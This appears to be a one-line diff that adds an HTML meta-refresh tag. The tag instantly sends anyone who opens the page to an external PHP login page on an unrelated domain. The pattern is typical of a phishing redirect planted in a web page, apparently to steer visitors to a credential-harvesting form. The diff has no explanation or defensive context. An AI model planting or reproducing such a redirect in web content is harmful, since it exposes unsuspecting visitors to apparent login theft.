@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0;URL=http://disieu.com/dmlm/login_1.php" />
